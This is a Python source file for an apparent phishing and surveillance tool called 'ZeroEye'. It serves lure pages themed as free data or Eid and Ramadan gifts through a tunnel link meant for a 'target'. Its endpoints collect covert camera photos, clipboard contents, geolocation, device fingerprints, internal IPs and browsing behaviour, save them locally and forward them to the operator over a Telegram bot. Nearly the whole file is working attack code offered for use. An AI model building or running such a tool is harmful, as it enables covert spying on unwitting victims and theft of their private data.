import os
import sys
import json
import time
import shutil
from fastapi import FastAPI, UploadFile, File, Form
from fastapi.responses import HTMLResponse
from fastapi.staticfiles import StaticFiles
from fastapi.middleware.cors import CORSMiddleware
import uvicorn
from rich.console import Console
from rich.prompt import Prompt, Confirm
from rich.panel import Panel
from rich.table import Table

from core.banner import get_banner
from core.bot import TelegramSender
from core.tunnel import TunnelManager

console = Console()
app = FastAPI(docs_url=None, redoc_url=None)
app.add_middleware(
    CORSMiddleware, 
    allow_origins=["*"], 
    allow_methods=["*"], 
    allow_headers=["*"]
)

# Ensure directories exist
if not os.path.exists("static"): os.makedirs("static")
if not os.path.exists("captured"): os.makedirs("captured")
if not os.path.exists("templates"): os.makedirs("templates")

app.mount("/static", StaticFiles(directory="static"), name="static")

CONFIG_FILE = "config.json"
CONFIG = {
    "telegram_enabled": False, 
    "bot_token": "", 
    "chat_id": "", 
    "template": "free_data"
}
bot = None

# --- CONFIG MANAGEMENT ---
def load_config():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r') as f:
                return json.load(f)
        except Exception as e:
            console.print(f"[red][!] Error loading config: {e}[/red]")
            return None
    return None

def save_config(conf):
    try:
        with open(CONFIG_FILE, 'w') as f:
            json.dump(conf, f, indent=2)
        return True
    except Exception as e:
        console.print(f"[red][!] Error saving config: {e}[/red]")
        return False

def delete_config():
    try:
        if os.path.exists(CONFIG_FILE):
            os.remove(CONFIG_FILE)
            return True
    except:
        pass
    return False

def save_local(filename, data):
    try:
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        with open(f"captured/{filename}", "a", encoding='utf-8') as f:
            f.write(f"\n{'='*60}\n")
            f.write(f"Timestamp: {timestamp}\n")
            f.write(f"{'='*60}\n")
            f.write(f"{data}\n\n")
    except Exception as e:
        console.print(f"[red][!] Error saving local file: {e}[/red]")

# --- ULTRA DATA HANDLING ENDPOINTS ---

@app.get("/")
async def serve_index():
    path = f"templates/{CONFIG['template']}.html"
    if os.path.exists(path):
        with open(path, "r", encoding="utf-8") as f: 
            return HTMLResponse(f.read())
    return HTMLResponse("<h1>Error: Template not found</h1>")

@app.post("/upload_sys")
async def receive_sys(data: str = Form(...)):
    try:
        info = json.loads(data)
        
        # Create comprehensive display
        table = Table(show_header=True, header_style="bold green")
        table.add_column("Category", style="cyan", width=20)
        table.add_column("Details", style="white")
        
        if 'basic' in info:
            basic = info['basic']
            table.add_row("📱 Device", f"{basic.get('platform', 'Unknown')} | {basic.get('userAgent', '')[:50]}...")
            table.add_row("🖥️ Screen", f"{basic['screen']['width']}x{basic['screen']['height']} | {basic['screen']['colorDepth']}bit")
            table.add_row("🌐 Timezone", basic['timezone']['name'])
        
        if 'fingerprint' in info:
            fp = info['fingerprint']
            table.add_row("🔍 Fingerprint", f"Canvas: {fp.get('canvas', '')[:20]}... | Fonts: {len(fp.get('fonts', []))}")
        
        if 'network' in info:
            net = info['network']
            table.add_row("📡 Network", f"Type: {net.get('connection', {}).get('effectiveType', 'Unknown')} | IPs: {len(net.get('ips', []))}")
        
        console.print(Panel(table, title="🎯 [bold green]ULTRA INTELLIGENCE CAPTURED[/bold green]", border_style="green"))
        
        # Telegram notification
        if bot:
            telegram_msg = "🎯 *ULTRA INTELLIGENCE CAPTURED*\n\n"
            if 'basic' in info:
                basic = info['basic']
                telegram_msg += f"*Device:* {basic.get('platform', 'Unknown')}\n"
                telegram_msg += f"*Screen:* {basic['screen']['width']}x{basic['screen']['height']}\n"
                telegram_msg += f"*Timezone:* {basic['timezone']['name']}\n"
            if 'network' in info and info['network'].get('ips'):
                telegram_msg += f"*IPs:* {', '.join(info['network']['ips'][:3])}\n"
            
            bot.send_message(telegram_msg)
        
        save_local("ultra_intel.txt", json.dumps(info, indent=2))
        return {"status": "ok"}
        
    except Exception as e:
        console.print(f"[red][!] Error processing ultra intelligence: {e}[/red]")
        return {"status": "error"}

@app.post("/upload_cam")
async def receive_cam(file: UploadFile = File(...)):
    try:
        filename = f"captured/cam_{int(time.time())}.jpg"
        with open(filename, "wb") as buffer: 
            shutil.copyfileobj(file.file, buffer)
        
        console.print(f"[green][+] Stealth photo captured: {filename}[/green]")
        
        if bot: 
            bot.send_photo(filename, caption="📸 *Stealth Camera Capture*")
            
        return {"status": "ok"}
        
    except Exception as e:
        console.print(f"[red][!] Error processing camera: {e}[/red]")
        return {"status": "error"}

@app.post("/upload_clipboard")
async def receive_clipboard(data: str = Form(...)):
    try:
        info = json.loads(data)
        content = info.get('content', '')
        
        console.print(Panel(
            f"[bold red]📋 CLIPBOARD DATA CAPTURED[/bold red]\n\n"
            f"[cyan]Content:[/cyan] {content[:100]}{'...' if len(content) > 100 else ''}\n"
            f"[cyan]Length:[/cyan] {info.get('length', 0)} characters",
            title="Clipboard Surveillance",
            border_style="red"
        ))
        
        if bot and content:
            bot.send_message(f"📋 *Clipboard Data*\n\n`{content[:300]}`")
        
        save_local("clipboard.txt", f"Clipboard: {content}")
        return {"status": "ok"}
        
    except Exception as e:
        console.print(f"[red][!] Error processing clipboard: {e}[/red]")
        return {"status": "error"}

@app.post("/upload_location")
async def receive_location(data: str = Form(...)):
    try:
        info = json.loads(data)
        
        if 'latitude' in info:
            console.print(Panel(
                f"[bold yellow]📍 LOCATION DATA CAPTURED[/bold yellow]\n\n"
                f"[cyan]Latitude:[/cyan] {info['latitude']}\n"
                f"[cyan]Longitude:[/cyan] {info['longitude']}\n"
                f"[cyan]Accuracy:[/cyan] {info.get('accuracy', 'Unknown')} meters",
                title="Geolocation Intelligence",
                border_style="yellow"
            ))
            
            if bot:
                bot.send_message(f"📍 *Location Data*\n\nLat: {info['latitude']}\nLon: {info['longitude']}\nAccuracy: {info.get('accuracy')}m")
        
        save_local("location.txt", json.dumps(info, indent=2))
        return {"status": "ok"}
        
    except Exception as e:
        console.print(f"[red][!] Error processing location: {e}[/red]")
        return {"status": "error"}

@app.post("/upload_battery")
async def receive_battery(data: str = Form(...)):
    try:
        info = json.loads(data)
        
        console.print(f"[cyan][+] Battery: {info.get('level', 'Unknown')}% | Charging: {info.get('charging', 'Unknown')}[/cyan]")
        
        if bot and 'level' in info:
            bot.send_message(f"🔋 *Battery Status*\n\nLevel: {info['level']}%\nCharging: {info.get('charging', 'Unknown')}")
        
        save_local("battery.txt", json.dumps(info, indent=2))
        return {"status": "ok"}
        
    except Exception as e:
        console.print(f"[red][!] Error processing battery: {e}[/red]")
        return {"status": "error"}

@app.post("/upload_behavior")
async def receive_behavior(data: str = Form(...)):
    try:
        info = json.loads(data)
        
        movements = len(info.get('mouseMovements', []))
        clicks = len(info.get('clicks', []))
        scrolls = len(info.get('scrolls', []))
        
        console.print(f"[blue][+] Behavior: {movements} moves, {clicks} clicks, {scrolls} scrolls[/blue]")
        
        if bot and (movements > 50 or clicks > 0):
            bot.send_message(f"🎯 *Behavior Data*\n\nMovements: {movements}\nClicks: {clicks}\nScrolls: {scrolls}")
        
        save_local("behavior.txt", f"Session {info.get('sessionId')}: {movements} moves, {clicks} clicks")
        return {"status": "ok"}
        
    except Exception as e:
        console.print(f"[red][!] Error processing behavior: {e}[/red]")
        return {"status": "error"}

@app.post("/upload_heartbeat")
async def receive_heartbeat(data: str = Form(...)):
    try:
        info = json.loads(data)
        # Silent heartbeat - just log to file
        save_local("heartbeat.txt", f"Heartbeat: {info.get('url', 'Unknown')} | {info.get('timestamp')}")
        return {"status": "ok"}
    except:
        return {"status": "error"}

@app.post("/upload_navigation")
async def receive_navigation(data: str = Form(...)):
    try:
        info = json.loads(data)
        console.print(f"[magenta][+] Navigation: {info.get('from', '')} → {info.get('to', '')}[/magenta]")
        save_local("navigation.txt", f"Nav: {info.get('from')} → {info.get('to')}")
        return {"status": "ok"}
    except:
        return {"status": "error"}

@app.post("/upload_ip")
async def receive_ip(data: str = Form(...)):
    try:
        info = json.loads(data)
        ip_addr = info.get('internal_ip', 'Unknown')
        
        console.print(f"[green][+] IP Leak: {ip_addr}[/green]")
        
        if bot: 
            bot.send_message(f"🌐 *IP Leak*\n\n`{ip_addr}`")
        
        save_local("ip_logs.txt", f"IP: {ip_addr}")
        return {"status": "ok"}
        
    except Exception as e:
        console.print(f"[red][!] Error processing IP: {e}[/red]")
        return {"status": "error"}

# --- WIZARD INTERFACE ---
def start_wizard():
    console.clear()
    console.print(get_banner())
    
    # Config persistence
    saved_conf = load_config()
    global bot, CONFIG
    
    if saved_conf:
        console.print("\n[cyan]📁 Found saved configuration[/cyan]")
        
        table = Table(show_header=False, box=None)
        table.add_column("Setting", style="cyan")
        table.add_column("Value", style="white")
        
        token_preview = saved_conf['bot_token'][:8] + "..." if saved_conf['bot_token'] else "Not set"
        table.add_row("Bot Token", token_preview)
        table.add_row("Chat ID", saved_conf['chat_id'] or "Not set")
        table.add_row("Template", saved_conf['template'])
        table.add_row("Telegram", "✅ Enabled" if saved_conf['telegram_enabled'] else "❌ Disabled")
        
        console.print(table)
        
        choice = Prompt.ask(
            "Use saved settings?", 
            choices=["y", "n", "delete"], 
            default="y"
        )
        
        if choice == "y":
            CONFIG.update(saved_conf)
            if CONFIG["telegram_enabled"] and CONFIG["bot_token"] and CONFIG["chat_id"]:
                bot = TelegramSender(CONFIG["bot_token"], CONFIG["chat_id"])
        elif choice == "delete":
            if delete_config():
                console.print("[green][✓] Configuration deleted[/green]")
            saved_conf = None
        else:
            saved_conf = None

    if not saved_conf:
        console.print("\n[bold yellow]🤖 Telegram Configuration[/bold yellow]")
        if Confirm.ask("Enable Telegram exfiltration?", default=True):
            CONFIG["telegram_enabled"] = True
            CONFIG["bot_token"] = Prompt.ask("Enter Bot Token")
            CONFIG["chat_id"] = Prompt.ask("Enter Chat ID")
            
            test_bot = TelegramSender(CONFIG["bot_token"], CONFIG["chat_id"])
            if Confirm.ask("Save these settings for future use?", default=True):
                if save_config(CONFIG):
                    console.print("[green][✓] Configuration saved[/green]")
            
            bot = test_bot
        else:
            CONFIG["telegram_enabled"] = False

    # Template selection
    console.print("\n[bold cyan]🎨 Select Template[/bold cyan]")
    templates = {
        "1": ("🎁 Free Data", "free_data"),
        "2": ("🌙 Eid Gift", "eid"), 
        "3": ("🕌 Ramadan", "ramadan")
    }
    
    for key, (name, _) in templates.items():
        console.print(f"  {key}. {name}")
    
    choice = Prompt.ask("Choose template", choices=list(templates.keys()), default="1")
    CONFIG["template"] = templates[choice][1]
    console.print(f"[green][✓] Selected: {templates[choice][0]}[/green]")

    # Start server
    port = 8080
    console.print(f"\n[green][*] Starting ultra-stealth server on port {port}...[/green]")
    
    tunnel = TunnelManager(port)
    url = tunnel.start_cloudflared()
    
    console.print(Panel(
        f"[bold cyan]🎯 ULTRA STEALTH MODE ACTIVE[/bold cyan]\n\n"
        f"[bold green]{url}[/bold green]\n\n"
        f"[yellow]📋 Send this link to target[/yellow]\n"
        f"[grey50]💡 Ultra features: Fingerprinting, Behavior tracking, Clipboard surveillance[/grey50]",
        title="ZeroEye v2.0 - Ultra Stealth",
        border_style="green",
        expand=False
    ))
    
    console.print("\n[cyan]🛡️  Ultra stealth active... Press Ctrl+C to stop[/cyan]")
    
    try:
        uvicorn.run(app, host="0.0.0.0", port=port, log_level="error")
    except KeyboardInterrupt:
        console.print("\n[yellow][!] Shutting down ZeroEye...[/yellow]")
    except Exception as e:
        console.print(f"[red][!] Server error: {e}[/red]")

if __name__ == "__main__":
    start_wizard()
